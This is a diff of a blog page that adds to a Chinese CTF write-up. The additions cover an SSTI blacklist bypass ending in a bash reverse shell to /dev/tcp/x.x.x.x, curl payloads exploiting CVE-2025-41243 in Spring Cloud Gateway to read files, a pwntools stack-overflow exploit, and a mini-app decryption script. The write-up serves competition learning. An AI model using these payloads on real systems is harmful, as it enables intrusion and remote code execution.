@@ -41,8 +41,20 @@
 <meta property="og:image" content="http://laijunyue.github.io/images/image-20251025103327405.png">
 <meta property="og:image" content="http://laijunyue.github.io/images/image-20251025103557060.png">
 <meta property="og:image" content="http://laijunyue.github.io/images/image-20251025172655688.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251025181051950.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251026113454704.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251026114325153.png">
+<meta property="og:image" content="http://laijunyue.github.io/2025/10/20/images/image-20251025224540068.png">
+<meta property="og:image" content="http://laijunyue.github.io/2025/10/20/images/image-20251027160722404.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251025143723161.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251025143733292.png">
+<meta property="og:image" content="http://laijunyue.github.io/2025/10/20/images/image-20251025144300127.png">
+<meta property="og:image" content="http://laijunyue.github.io/2025/10/20/images/image-20251025134144144.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251025134349745.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251025134419122.png">
+<meta property="og:image" content="http://laijunyue.github.io/2025/10/20/images/image-20251025142413580.png">
 <meta property="article:published_time" content="2025-10-20T08:09:11.000Z">
-<meta property="article:modified_time" content="2025-11-04T01:44:14.077Z">
+<meta property="article:modified_time" content="2025-11-25T09:24:14.980Z">
 <meta property="article:author" content="xiaolaisec">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="JAVA">
@@ -430,8 +442,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-11-04 09:44:14</span>
-            <span class="mobile">2025-11-04 09:44:14</span>
+            <span class="desktop">2025-11-25 17:24:14</span>
+            <span class="mobile">2025-11-25 17:24:14</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -757,7 +769,156 @@
                      data-src="/../images/image-20251025172655688.png"
                       alt="image-20251025172655688"
                 ></p>
-<p>SSTI，现在的关键是要绕过<code>len(username) &lt;= 47</code>长度限制以及黑名单&#96;[“config”, “_”, “read”, “</p>
+<p>SSTI，现在的关键是要绕过<code>len(username) &lt;= 47</code>长度限制以及黑名单</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;config&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;read&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251025181051950.png"
+                      alt="image-20251025181051950"
+                ></p>
+<p>通过16进制绕过<code>_</code>和<code>read</code>，通过本题环境给的<code>sset()</code>函数进行赋值，<code>sget()</code>函数进行获取</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set a=sset(&#x27;g&#x27;,&#x27;\x5f\x5fglobals\x5f\x5f&#x27;)%&#125;</span><br><span class="line">&#123;%set a=sset(&#x27;r&#x27;,&#x27;\x72\x65\x61\x64&#x27;)%&#125; #read</span><br></pre></td></tr></table></figure></div>
+
+<p>打印一下，可以发现已经可以获取到<code>os</code>模块了</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print (lipsum|attr(sget(%27g%27))).os%&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251026113454704.png"
+                      alt="image-20251026113454704"
+                ></p>
+<p>如果没有长度限制，下面的payload（长度71）即可RCE</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print (lipsum|attr(sget(&#x27;g&#x27;))).os.popen(&#x27;whoami&#x27;)|attr(sget(&#x27;r&#x27;))()%&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251026114325153.png"
+                      alt="image-20251026114325153"
+                ></p>
+<p>由于长度限制卡住了，因为禁用了config，无法实现拼接绕过</p>
+<p>发现下面payload可以反弹shell</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set a=sset(&#x27;g&#x27;,&#x27;\x5f\x5fglobals\x5f\x5f&#x27;)%&#125;</span><br><span class="line">&#123;%sset(&#x27;s&#x27;,request.args.s)%&#125;&amp;s=bash -c &quot;bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1&quot;</span><br><span class="line">&#123;%print lipsum[sget(&#x27;g&#x27;)].os.popen(sget(&#x27;s&#x27;))%&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>长度卡得刚刚好</p>
+<h2 id="ezcloud"><a href="#ezcloud" class="headerlink" title="ezcloud"></a>ezcloud</h2><p><strong>考点：sprintboot gateway漏洞</strong></p>
+<p>发现存在actuator目录泄漏</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="../images/image-20251025224540068.png"
+                      alt="image-20251025224540068" style="zoom:50%;" 
+                >
+
+<p>在env中可以看到gateway可以访问</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="../images/image-20251027160722404.png"
+                      alt="image-20251027160722404" style="zoom:80%;" 
+                >
+
+<p>找到CVE-2025-41243 Spring Cloud Gateway SpEL 沙箱从任意属性访问到任意文件下载，参考<a class="link"   target="_blank" rel="noopener" href="https://psytester.github.io/CVE-2025-41243_Spring_SpEL_property_modification/%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB%EF%BC%8C%E5%88%9B%E5%BB%BA%E6%96%B0%E8%B7%AF%E7%94%B1%E8%AF%BB%E5%8F%96flag" >https://psytester.github.io/CVE-2025-41243_Spring_SpEL_property_modification/进行攻击，创建新路由读取flag <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X POST <span class="string">&#x27;http://web-db4aa78b9a.challenge.xctf.org.cn/actuator/gateway/routes/test&#x27;</span> </span><br><span class="line">  -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">  --data-raw $<span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;id&quot;: &quot;test&quot;,</span></span><br><span class="line"><span class="string">  &quot;filters&quot;: [&#123;</span></span><br><span class="line"><span class="string">    &quot;name&quot;: &quot;AddResponseHeader&quot;,</span></span><br><span class="line"><span class="string">    &quot;args&quot;: &#123;</span></span><br><span class="line"><span class="string">      &quot;name&quot;: &quot;Result&quot;,</span></span><br><span class="line"><span class="string">      &quot;value&quot;: &quot;#&#123;@systemProperties[&#x27;</span>spring.cloud.gateway.restrictive-property-accessor.enabled<span class="string">&#x27;] = &#x27;</span><span class="literal">false</span><span class="string">&#x27;&#125;&quot;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;],</span></span><br><span class="line"><span class="string">  &quot;uri&quot;: &quot;http://web-db4aa78b9a.challenge.xctf.org.cn/&quot;,</span></span><br><span class="line"><span class="string">  &quot;order&quot;:0</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">curl -i -X POST <span class="string">&#x27;http://web-db4aa78b9a.challenge.xctf.org.cn/actuator/gateway/routes/test&#x27;</span> </span><br><span class="line">  -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">  --data-raw $<span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;id&quot;: &quot;test&quot;,</span></span><br><span class="line"><span class="string">  &quot;filters&quot;: [&#123;</span></span><br><span class="line"><span class="string">    &quot;name&quot;: &quot;AddResponseHeader&quot;,</span></span><br><span class="line"><span class="string">    &quot;args&quot;: &#123;</span></span><br><span class="line"><span class="string">      &quot;name&quot;: &quot;Result&quot;,</span></span><br><span class="line"><span class="string">      &quot;value&quot;: &quot;#&#123;@resourceHandlerMapping.urlMap[&#x27;</span>/webjars/**<span class="string">&#x27;].locationValues[0]=&#x27;</span>file:///<span class="string">&#x27;&#125;&quot;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;],</span></span><br><span class="line"><span class="string">  &quot;uri&quot;: &quot;http://web-db4aa78b9a.challenge.xctf.org.cn/&quot;,</span></span><br><span class="line"><span class="string">  &quot;order&quot;:0</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">curl -i -X POST <span class="string">&#x27;http://web-db4aa78b9a.challenge.xctf.org.cn/actuator/gateway/routes/test&#x27;</span> </span><br><span class="line">  -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">  --data-raw $<span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;id&quot;: &quot;test&quot;,</span></span><br><span class="line"><span class="string">  &quot;filters&quot;: [&#123;</span></span><br><span class="line"><span class="string">    &quot;name&quot;: &quot;AddResponseHeader&quot;,</span></span><br><span class="line"><span class="string">    &quot;args&quot;: &#123;</span></span><br><span class="line"><span class="string">      &quot;name&quot;: &quot;Result&quot;,</span></span><br><span class="line"><span class="string">      &quot;value&quot;: &quot;#&#123;@resourceHandlerMapping.urlMap[&#x27;</span>/webjars/**<span class="string">&#x27;].afterPropertiesSet&#125;&quot;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;],</span></span><br><span class="line"><span class="string">  &quot;uri&quot;: &quot;http://web-db4aa78b9a.challenge.xctf.org.cn/&quot;,</span></span><br><span class="line"><span class="string">  &quot;order&quot;:0</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#apply new route</span></span><br><span class="line">curl -X POST -i http://web-db4aa78b9a.challenge.xctf.org.cn/actuator/gateway/routes/refresh</span><br><span class="line"></span><br><span class="line"><span class="comment"># read flag</span></span><br><span class="line">curl http://web-db4aa78b9a.challenge.xctf.org.cn/webjars/flag</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="ecshop"><a href="#ecshop" class="headerlink" title="ecshop"></a>ecshop</h2><p>ECShop v4.1.19</p>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h2><p>IDA反编译</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251025143723161.png"
+                      alt="image-20251025143723161"
+                ></p>
+<p>v2变量明显的栈溢出</p>
+<p>通过栈溢出改变量：</p>
+<ul>
+<li><code>v2</code> 只有 248 字节（0xF8），却用 <code>read(…, 0x100)</code> 读了 256 字节，**正好多写 8 字节覆盖紧随其后的 <code>v3</code>**。</li>
+<li>代码在尾部判断 <code>if (v3 != 20150972)</code>；只有当 <code>v3 == 20150972</code> 时才会执行 <code>system(&quot;/bin/sh&quot;)</code>。</li>
+<li>架构是 x86_64 小端序，因此把 20150972 写成 8 字节小端：<code>b&#39;\xbc\x7a\x33\x01\x00\x00\x00\x00&#39;</code>（20150972 十六进制是 <code>0x01337ABC</code>）。</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251025143733292.png"
+                      alt="image-20251025143733292"
+                ></p>
+<h3 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exploit.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_exploit</span>(<span class="params">io</span>):</span><br><span class="line">    <span class="comment"># 填满 s（24 字节）</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Enter your flag1:&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造覆盖 v3 的 payload</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Enter your flag2:&#x27;</span>)</span><br><span class="line">    payload  = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xF8</span>              <span class="comment"># 填满 v2</span></span><br><span class="line">    payload += p64(<span class="number">20150972</span>)            <span class="comment"># 覆盖 v3 为 20150972 (0x01337ABC)</span></span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 拿到 shell 后尝试读 flag</span></span><br><span class="line">    <span class="comment"># 具体 flag 名称/路径视题面而定，这里常见路径都试一下</span></span><br><span class="line">    io.sendline(<span class="string">b&#x27;cat /flag || cat flag || /readflag&#x27;</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;pwn-9dc9ee9e42.challenge.xctf.org.cn&quot;</span>, <span class="number">9999</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">    do_exploit(io)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="../images/image-20251025144300127.png"
+                      alt="image-20251025144300127" style="zoom:80%;" 
+                >
+
+<h1 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h1><h2 id="EZMiniAPP"><a href="#EZMiniAPP" class="headerlink" title="EZMiniAPP"></a>EZMiniAPP</h2><p>附件是一个.wxapkg包，使用CrackMinApp工具反编译得到文件</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="../images/image-20251025134144144.png"
+                      alt="image-20251025134144144" style="zoom:80%;" 
+                >
+
+<p>核心逻辑在页面 <code>pages/index/index.js</code> 对用户输入做了一个自定义加密，然后与一个常量数组逐字节比较，正确就弹 “Right”，否则 “Wrong”</p>
+<h3 id="找到加密的key"><a href="#找到加密的key" class="headerlink" title="找到加密的key"></a>找到加密的key</h3><p>在 <code>chunk_0.appservice.js</code> 里（以及其 sourcemap），<code>index</code> 页有一个调用：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251025134349745.png"
+                      alt="image-20251025134349745"
+                ></p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="title function_">customEncrypt</span>(a, <span class="string">&quot;newKey2025!&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>随后把返回值和一个常量做比较（可以看到 <code>wx.showToast(&#123; title: &quot;Right&quot; ... &#125;) / &quot;Wrong&quot;</code> 的分支）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251025134419122.png"
+                      alt="image-20251025134419122"
+                ></p>
+<p>常量目标是一个数组</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1, 33, 194, 133, 195, 102, 232, 104, 200, 14, 8, 163, 131, 71, 68, 97, 2, 76, 72, 171, 74, 106, 225, 1, 65]</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="还原加密算法（customEncrypt）"><a href="#还原加密算法（customEncrypt）" class="headerlink" title="还原加密算法（customEncrypt）"></a>还原加密算法（customEncrypt）</h3><p>根据反编译到的代码片段可以准确复原出如下逻辑（变量名我改成可读的）：</p>
+<ol>
+<li>把密钥 <code>&quot;newKey2025!&quot;</code> 转为字节数组 <code>key[i] = ord(key[i])</code>，记 <code>K = len(key)</code></li>
+<li>计算位旋转步长 <code>c = (sum(key) % 8)</code><ul>
+<li>对给定密钥求和：<code>sum(&quot;newKey2025!&quot;) = 861</code>，因此 <code>c = 861 % 8 = 5</code></li>
+</ul>
+</li>
+<li>遍历输入明文 <code>a</code> 的每个字符（下标 o &#x3D; 0..N-1）：<ul>
+<li>先做异或：<code>u = ord(a[o]) ^ key[o % K]</code></li>
+<li>再做 8 位左旋：<code>h = ((u &lt;&lt; c) | (u &gt;&gt; (8 - c))) &amp; 0xff</code></li>
+<li>将 <code>h</code> 追加进结果数组（最终返回的是一个整型数组）</li>
+</ul>
+</li>
+<li>用 <code>JSON.stringify(result)</code> 和上面的常量数组字符串做全等比较，相等则判定正确</li>
+</ol>
+<blockquote>
+<p>注意：代码里有个 <code>switch(o % 3)</code> 的分支看似换了异或左右，但 <code>x ^ y == y ^ x</code>，实质不影响；另有模板&#x2F;调试埋点与 <code>unshift</code> 的 UI 片段容易干扰阅读，但最终实际用于比较的就是 <strong>按顺序 append</strong> 的整型数组。</p>
+</blockquote>
+<h3 id="逆向解密得到明文"><a href="#逆向解密得到明文" class="headerlink" title="逆向解密得到明文"></a>逆向解密得到明文</h3><p>因为我们已知 <code>c = 5</code>、密钥、目标数组 <code>T</code>，逆向就很直接：</p>
+<ul>
+<li>逐元素把 <code>T[o]</code> 右旋 <code>c</code> 位：<code>u = ror(T[o], c)</code></li>
+<li>再与密钥异或：<code>plain[o] = chr(u ^ key[o % K])</code></li>
+</ul>
+<p>用这套逆向对上面的 25 个字节跑一遍，得到明文正好是：</p>
+<p><strong>flag{JustEasyMiniProgram}</strong></p>
+<h3 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rotr</span>(<span class="params">x, n</span>): <span class="keyword">return</span> ((x &gt;&gt; n) | ((x &lt;&lt; (<span class="number">8</span>-n)) &amp; <span class="number">0xff</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">T = [<span class="number">1</span>,<span class="number">33</span>,<span class="number">194</span>,<span class="number">133</span>,<span class="number">195</span>,<span class="number">102</span>,<span class="number">232</span>,<span class="number">104</span>,<span class="number">200</span>,<span class="number">14</span>,<span class="number">8</span>,<span class="number">163</span>,<span class="number">131</span>,<span class="number">71</span>,<span class="number">68</span>,<span class="number">97</span>,<span class="number">2</span>,<span class="number">76</span>,<span class="number">72</span>,<span class="number">171</span>,<span class="number">74</span>,<span class="number">106</span>,<span class="number">225</span>,<span class="number">1</span>,<span class="number">65</span>]</span><br><span class="line">key = [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;newKey2025!&quot;</span>]</span><br><span class="line">c = <span class="built_in">sum</span>(key) % <span class="number">8</span>  <span class="comment"># 5</span></span><br><span class="line">plain = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(rotr(T[o], c) ^ key[o % <span class="built_in">len</span>(key)]) <span class="keyword">for</span> o <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(T)))</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br><span class="line"><span class="comment"># flag&#123;JustEasyMiniProgram&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<h1 id="低空经济网络安全"><a href="#低空经济网络安全" class="headerlink" title="低空经济网络安全"></a>低空经济网络安全</h1><h2 id="The-Hidden-Link"><a href="#The-Hidden-Link" class="headerlink" title="The Hidden Link"></a>The Hidden Link</h2><p>也只能感慨AI太强大了</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="../images/image-20251025142413580.png"
+                      alt="image-20251025142413580" style="zoom:80%;" 
+                >
+
+<p>把<code>flag&#123;dr0n3_flight_c0ntr0ll3r_h4ck3d&#125;</code>改为<code>flag&#123;dr0n3_fl1ght_c0ntr0ll3r_h4ck3d&#125;</code>即为正确flag</p>
+<h1 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h1><h2 id="small-injection"><a href="#small-injection" class="headerlink" title="small_injection"></a>small_injection</h2><p>基于AI环境下的python沙箱绕过</p>
 
         </div>
 
@@ -772,7 +933,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-11-04 09:44:14
+                    :</strong> 2025-11-25 17:24:14
             </li>
         
         <li>
@@ -907,7 +1068,7 @@
     <div class="post-toc">
         <div class="toc-title">On this page</div>
         <div class="page-title">强网杯2025+强网拟态线上预选赛 WP</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF2025"><span class="nav-text">强网杯2025</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SecretVault"><span class="nav-text">SecretVault</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9%E4%B8%80"><span class="nav-text">漏洞点一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9%E4%BA%8C"><span class="nav-text">漏洞点二</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bbjv"><span class="nav-text">bbjv</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#POC"><span class="nav-text">POC</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#yamcs"><span class="nav-text">yamcs</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezphp"><span class="nav-text">ezphp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E4%B8%80-%E5%A6%82%E4%BD%95%E8%B0%83%E7%94%A8%E5%88%B0%E5%8C%BF%E5%90%8D%E7%B1%BB%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-text">问题一 如何调用到匿名类的方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E4%BA%8C-%E4%BB%85%E7%94%A8-func-%E5%A6%82%E4%BD%95%E8%B0%83%E7%94%A8%E5%8C%BF%E5%90%8D%E7%B1%BB%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-text">问题二 仅用$func()如何调用匿名类的方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E4%B8%89-%E7%BB%95%E8%BF%87WAF"><span class="nav-text">问题三 绕过WAF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E5%9B%9B-%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E5%90%AB-phar%E7%9A%84%E6%96%87%E4%BB%B6%E5%90%8D"><span class="nav-text">问题四 如何获取含.phar的文件名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-1"><span class="nav-text">EXP</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E7%BA%BF%E4%B8%8A%E9%A2%84%E9%80%89%E8%B5%9B"><span class="nav-text">强网拟态线上预选赛</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-1"><span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#smallcode"><span class="nav-text">smallcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-2"><span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#safesecret"><span class="nav-text">safesecret</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF2025"><span class="nav-text">强网杯2025</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SecretVault"><span class="nav-text">SecretVault</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9%E4%B8%80"><span class="nav-text">漏洞点一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9%E4%BA%8C"><span class="nav-text">漏洞点二</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bbjv"><span class="nav-text">bbjv</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#POC"><span class="nav-text">POC</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#yamcs"><span class="nav-text">yamcs</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezphp"><span class="nav-text">ezphp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E4%B8%80-%E5%A6%82%E4%BD%95%E8%B0%83%E7%94%A8%E5%88%B0%E5%8C%BF%E5%90%8D%E7%B1%BB%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-text">问题一 如何调用到匿名类的方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E4%BA%8C-%E4%BB%85%E7%94%A8-func-%E5%A6%82%E4%BD%95%E8%B0%83%E7%94%A8%E5%8C%BF%E5%90%8D%E7%B1%BB%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-text">问题二 仅用$func()如何调用匿名类的方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E4%B8%89-%E7%BB%95%E8%BF%87WAF"><span class="nav-text">问题三 绕过WAF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E5%9B%9B-%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E5%90%AB-phar%E7%9A%84%E6%96%87%E4%BB%B6%E5%90%8D"><span class="nav-text">问题四 如何获取含.phar的文件名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-1"><span class="nav-text">EXP</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" 